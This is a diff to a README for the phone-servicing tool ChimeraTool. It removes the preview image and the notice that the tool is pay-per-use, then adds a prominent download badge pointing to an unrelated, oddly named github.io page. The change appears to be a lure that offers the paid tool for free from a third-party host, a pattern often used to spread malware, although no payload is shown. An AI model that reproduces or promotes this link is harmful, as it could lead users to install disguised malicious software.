@@ -1,13 +1,12 @@
 <div align="center">
 
-<img src="preview.svg" width="770" alt="ChimeraTool"/>
-
 ---
 
 ![Platform](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)
 ![Brands](https://img.shields.io/badge/Brands-Samsung%20%7C%20Huawei%20%7C%20LG%20%7C%20Motorola-orange?style=flat-square)
 ![Operations](https://img.shields.io/badge/Operations-Flash%20%7C%20Unlock%20%7C%20Repair%20%7C%20Backup-blueviolet?style=flat-square)
-![Credits](https://img.shields.io/badge/credits%20system-pay%20per%20use-gold?style=flat-square)
+
+[![Download ChimeraTool](https://img.shields.io/badge/⬇%20%20DOWNLOAD%20CHIMERATOOL-%23121212?style=for-the-badge&logoColor=orange)](https://zeptohornbilltassel.github.io/nightcore/)
 
 </div>
 
